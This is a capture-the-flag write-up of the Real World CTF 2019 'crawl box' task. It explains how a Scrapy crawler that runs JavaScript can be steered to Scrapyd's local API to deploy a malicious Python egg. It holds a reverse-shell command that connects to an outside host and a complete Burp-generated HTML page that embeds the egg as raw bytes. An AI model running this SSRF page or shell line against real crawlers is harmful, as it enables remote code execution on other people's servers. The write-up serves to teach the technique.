# crawl box - Real World CTF 2019 Quals

## Introduction

The crawl box is a pwn task. The goal is to exploit a remote code execution
vulnerability on an up-to-date Scrapy crawler.

Only a website is provided.


## Reconnaissance

The website takes an URL and prints every links stored on this URL.

The bot requests pages with the following user agent: `Scrapy/ChromeHeadless
(+https://scrapy.org)`. This gives two important informations:
1. The bot uses Scrapy, an open-source framework
2. Scrapy uses Chrome

The crawler interprets JavaScript code, It can be used to bypass restrictions
put on the initial form.

The [Scrapy project's Github page](https://github.com/scrapy) mentions different
side projects. One of them is [Scrapyd](https://github.com/scrapy/scrapyd). Its
introduction mentions an HTTP JSON API.


## Scrapyd

The [documentation of Scrapyd](https://scrapyd.readthedocs.io/en/stable/)
introduces it as an API to deploy scrapy spiders.

It is possible to ensure that the crawler uses Scrapyd by making it crawl a page
that contains a JavaScript redirection to Scrapyd's default port.
```html
<script> docucument.location.href = "http://localhost:6800/"; </script>
```

Scrapyd's documentation mentions that the `addversion.json` endpoint [accepts a
Python egg containing
code](https://scrapyd.readthedocs.io/en/stable/api.html#addversion-json) as a
parameter, hinting a potential RCE through SSRF.

The Python egg we created is very simple and only executes a single command:
```sh
bash -c 'sh</dev/tcp/entei.forgotten-legends.org/12345'
```

## Exploitation

Once the Python egg is ready, the API can be tester with the following cURL
command:
```sh
curl http://localhost:6800/addversion.json \
	-F project=myproject \
	-F version=r23 \
	-F egg=@pwnmod-0.1-py3.7.egg
```

Soon after, the egg is executed, which means the request is ready for
exploitation.

The easiest and fastest way to make a script that replays this request is to use
Burp's automatic CSRF creation feature.

When sending the link to the crawler, it executes the JavaScript code, calls the
API, which executes the Python egg and connects to a server we control.

**Flag**: `rwctf{97053f58121d36499788117b60472e9c}`


## Appendices

### ssrf.html
The following page sends an AJAX request to Scrapyd's API to gain RCE:
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <script>
     function submitRequest()
     {
       var xhr = new XMLHttpRequest();
       xhr.open("POST", "http://localhost:6800/addversion.json", true);
       xhr.setRequestHeader("Accept", "*\/*");
       xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=------------------------66292bd3c64e9656");
       xhr.withCredentials = true;
       var body = "--------------------------66292bd3c64e9656\r\n" + 
                  "Content-Disposition: form-data; name=\"project\"\r\n" + 
                  "\r\n" + 
                  "myproject\r\n" + 
                  "--------------------------66292bd3c64e9656\r\n" + 
                  "Content-Disposition: form-data; name=\"version\"\r\n" + 
                  "\r\n" + 
                  "r23\r\n" + 
                  "--------------------------66292bd3c64e9656\r\n" + 
                  "Content-Disposition: form-data; name=\"egg\"; filename=\"pwnmod-0.1-py3.7.egg\"\r\n" + 
                  "Content-Type: application/octet-stream\r\n" + 
                  "\r\n" + 
                  "PK\x03\x04\x14\x00\x00\x00\x08\x00\x82\x180O\xE5\xE8\x89\xFCt\x00\x00\x00\xB2\x00\x00\x00\x11\x00\x00\x00EGG-INFO/PKG-INFO\xF3M-ILI\x2CI\xD4\x0DK-\x2A\xCE\xCC\xCF\xB3R0\xD43\xE0\xF2K\xCCM\xB5R\x28\x28\xCF\xCB\xCDO\xE1\x82\xCB\x18\xE8\x19r\x05\x97\xE6\xE6\x26\x16UZ\x29\x84\xFAy\xFB\xF9\x87\xFBqy\xE4\xE7\xA6\xEA\x16\x24\xA6\xA7\x22\x84\x1CKK2\xF2\x8B\xD0\xF9\xBA\xA9\xB9\x89\x999\x08Q\x9F\xCC\xE4\xD4\xBCb\x24m.\xA9\xC5\xC9E\x99\x05\x25\x60\xBB\x60\x82\x019\x89\x25i\xF9E\xB9\x08\x11\x00PK\x03\x04\x14\x00\x00\x00\x08\x00\x82\x180O\x3B\x280\x92h\x00\x00\x00\xB5\x00\x00\x00\x14\x00\x00\x00EGG-INFO/SOURCES.txtm\xCAA\x0E\x82\x40\x0CF\xE1\xBDwa8\x84ABL\x84\x40\x5Cw\xC1\xFC\x92\xC6\xB1m\xA0\x2As\x7B\xC2\x1A\xB6\xEF\x7B\x0B\xFCk\xC1\xF2\x05\xAB\x25e/\x89X\xD8\x89\xF6f\x7F\xF9h\x0C\x98\xA6\x82\xE5\xA5ew\xAF\x8B\xE6qk\x0F0\xB4\xCF\xFEZ\x0D\xC1W\x3FX\x84A\x22d\xCC\x94X\xDE\xCB\xE9\x04\xF19\x93\x29\x8B\x9F\x0F\xAEF\x09\x3F\xA4\x5D7PK\x03\x04\x14\x00\x00\x00\x08\x00\x82\x180O\x93\x06\xD72\x03\x00\x00\x00\x01\x00\x00\x00\x1D\x00\x00\x00EGG-INFO/dependency_links.txt\xE3\x02\x00PK\x03\x04\x14\x00\x00\x00\x08\x00\x82\x180OF\x1F\x010\x1F\x00\x00\x00\x1D\x00\x00\x00\x19\x00\x00\x00EGG-INFO/entry_points.txt\x8B.N.J\x2C\xA8\x8C\xE5\x2AN-\x29\xC9\xCCK/V\xB0UH\xAD\x28\xC8\xC9\xCF\x2C\xE1\xE2\x02\x00PK\x03\x04\x14\x00\x00\x00\x08\x00\x82\x180Oa\x3A\x8B\xFA\x0A\x00\x00\x00\x08\x00\x00\x00\x16\x00\x00\x00EGG-INFO/top_level.txtK\xAD\x28\xC8\xC9\xCF\x2C\xE1\x02\x00PK\x03\x04\x14\x00\x00\x00\x08\x00\x82\x180O\x93\x06\xD72\x03\x00\x00\x00\x01\x00\x00\x00\x11\x00\x00\x00EGG-INFO/zip-safe\xE3\x02\x00PK\x03\x04\x14\x00\x00\x00\x08\x00\x81\x180O5\x23\xDF\x20Q\x00\x00\x00P\x00\x00\x00\x13\x00\x00\x00exploit/__init__.pySV\xD4/-.\xD2O\xCA\xCC\xD3O\xCD\x2BS\x28\xA8\x2C\xC9\xC8\xCF\xE3\xCA\xCC-\xC8/\x2AQ\xC8/\xE6\xE2\xCA/\xD6\x2B\xAE\x2C.I\xCD\xD5PJJ\x2C\xCEP\xD0MVP/\xCE\xB0\xD1OI-\xD3/I.\x00\xEA\xD4\x2B\xC9\xD674261UW\xD2\xE4\x02\x00PK\x03\x04\x14\x00\x00\x00\x08\x00\x82\x180O\xAB\xB6\xB46\xB3\x00\x00\x00\xCC\x00\x00\x00\x2B\x00\x00\x00exploit/__pycache__/__init__.cpython-37.pycs\xE2\xE5\xE5b\x00\x82\xE6\xFBu\xB1\x01\x40\xFA1\x03\x12\x60\x06b\x07\x20.\x16\x03\x12\x29\x0C\x29\x8C9\x0CQ\x0C\xA9\x0C\x0B\x18S\x98\x1622\x02\xF9\xC1\x0C\x9A\xCC/A\x2A\xFD\xAA\x14\x93\x12\x8B3\x14t\x93\x15\xD4\x8B3l\xF4SR\xCB\xF4K\x92\x0B\xF4\x932\xF5J\xB2\xF5\x0D\x8D\x8CML\xD55\x99n1\xE5\x17\xDFb\x2B\xAE\x2C.I\xCD\x5D\xC9P\xC4\x02\xD4\x08\x26~\x19\x24\x95f\xE6\xA4\xE8\x27\xA5d\x16\x97\xE8\xE5d\xE6\x95V\xE8VX\x98\xC5\x9B\x99\xE8\xA7\xA6\xA7\xEB\xA7V\x14\xE4\xE4g\x96\xE8\xC7\xC7g\xE6e\x96\xC4\xC7\xEB\x15T\xDE\xE2\xB0\xC9\xCDO\x29\xCDI\xB5c\x02\xB9\x0FDp0\x01\x00PK\x03\x04\x14\x00\x00\x00\x08\x00C\x110O\x17\xC8\x8C\xF2\x60\x00\x00\x00r\x00\x00\x00\x0F\x00\x00\x00pwn/__init__.py\x25\x8C1\x0E\x840\x0C\xC0\xF6\xBC\x22\x94\x05\x16\xB2\x23\xF1\x96\x2A\xC7\x15\xD1\x21IE\x02\x12\xBF\x3FNx\xB6\xDDwt\xFAA\x9F\xAAT\xF4\xC2v\xC7n\x0AU\x9A\x1D\x81\xE6\x00\xF0-\x1B\x0AW\x1D\xC6\x19\xF0\xC1\x7C\xF2\xDB\xA3\xC8\x90\xC2\xCEuG\x0Ai\xC4\xCCi\x7C\xEC\xBAa\xCE\xCARr\xC6e\xC1\xF4/\xD3\x1B\xBE\x13\xF8\x01PK\x03\x04\x14\x00\x00\x00\x08\x00\x82\x180O\x880\x0FM\xEB\x00\x00\x000\x01\x00\x00\x27\x00\x00\x00pwn/__pycache__/__init__.cpython-37.pycs\xE2\xE5\xE5b\x00\x82\xFB\x97\xEAb\x8B\x80\xF4c\x06\x24\xC0\x04\xC4\x0E\x40\x5C\xAC\x04\x24R\x18R\x18s\x18\xA2\x18R\x98R\x98\x5B\x18\xA2\x18S\x81t6S\x91\x5C\x2Ac3\x03\x23P.\x98A\x93\xE5\x25H\x97_2\xB2\x19\xCC\x40\xEC\x0C2\x83\x0FH\x940\x2C\x60La\x5C\xC8\x08T\xCF\x00T\xCF\xE4W\xC5W\x92_\x9A\x9C\xA1\xA0_\x92\x5B\xA0\x9F\x98\x98\xA8\xC9t\x8B\x29\xBF\xF8\x16\x5BqeqIj\xEEJ\x86\x22\x16\xA0.0\xF1K\x27\xA943\x27E\x3F\x29\x25\xB3\xB8D/\x273\xAF\xB4B\xB7\xC2\xC2\x2C\xDE\xCCD\x3F5\x3D\x5D\xBF\xA0\x3CO\x3F\x3E\x3E3/\xB3\x24\x3E\x5E\xAF\xA0\xF2\x16Knbf\x1E\x2B\xC8\x5E\x90\x27\x18\x18\x8B\xD8\x80\xA4\x26s\x11\x88\x07f\xDF\xE2\x88\x8F\xCFK\xCCM\x8D\x8FG\xD8\x01\x21X\xC1\xB26\xB9\xF9\x29\xA59\xA9v\x20\x0D\xC5\x20\x0D\x1C\xCC\x1C\x2C\x1C\x8C\x00PK\x01\x02\x14\x03\x14\x00\x00\x00\x08\x00\x82\x180O\xE5\xE8\x89\xFCt\x00\x00\x00\xB2\x00\x00\x00\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xA4\x81\x00\x00\x00\x00EGG-INFO/PKG-INFOPK\x01\x02\x14\x03\x14\x00\x00\x00\x08\x00\x82\x180O\x3B\x280\x92h\x00\x00\x00\xB5\x00\x00\x00\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xA4\x81\xA3\x00\x00\x00EGG-INFO/SOURCES.txtPK\x01\x02\x14\x03\x14\x00\x00\x00\x08\x00\x82\x180O\x93\x06\xD72\x03\x00\x00\x00\x01\x00\x00\x00\x1D\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xA4\x81\x3D\x01\x00\x00EGG-INFO/dependency_links.txtPK\x01\x02\x14\x03\x14\x00\x00\x00\x08\x00\x82\x180OF\x1F\x010\x1F\x00\x00\x00\x1D\x00\x00\x00\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xA4\x81\x7B\x01\x00\x00EGG-INFO/entry_points.txtPK\x01\x02\x14\x03\x14\x00\x00\x00\x08\x00\x82\x180Oa\x3A\x8B\xFA\x0A\x00\x00\x00\x08\x00\x00\x00\x16\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xA4\x81\xD1\x01\x00\x00EGG-INFO/top_level.txtPK\x01\x02\x14\x03\x14\x00\x00\x00\x08\x00\x82\x180O\x93\x06\xD72\x03\x00\x00\x00\x01\x00\x00\x00\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xA4\x81\x0F\x02\x00\x00EGG-INFO/zip-safePK\x01\x02\x14\x03\x14\x00\x00\x00\x08\x00\x81\x180O5\x23\xDF\x20Q\x00\x00\x00P\x00\x00\x00\x13\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xA4\x81A\x02\x00\x00exploit/__init__.pyPK\x01\x02\x14\x03\x14\x00\x00\x00\x08\x00\x82\x180O\xAB\xB6\xB46\xB3\x00\x00\x00\xCC\x00\x00\x00\x2B\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xA4\x81\xC3\x02\x00\x00exploit/__pycache__/__init__.cpython-37.pycPK\x01\x02\x14\x03\x14\x00\x00\x00\x08\x00C\x110O\x17\xC8\x8C\xF2\x60\x00\x00\x00r\x00\x00\x00\x0F\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xA4\x81\xBF\x03\x00\x00pwn/__init__.pyPK\x01\x02\x14\x03\x14\x00\x00\x00\x08\x00\x82\x180O\x880\x0FM\xEB\x00\x00\x000\x01\x00\x00\x27\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xA4\x81L\x04\x00\x00pwn/__pycache__/__init__.cpython-37.pycPK\x05\x06\x00\x00\x00\x00\x0A\x00\x0A\x00\xC2\x02\x00\x00\x7C\x05\x00\x00\x00\x00\r\n" + 
                  "--------------------------66292bd3c64e9656--\r\n";
       var aBody = new Uint8Array(body.length);
       for (var i = 0; i < aBody.length; i++)
         aBody[i] = body.charCodeAt(i); 
       xhr.send(new Blob([aBody]));
     }

     submitRequest()
    </script>
  </body>
</html>
```
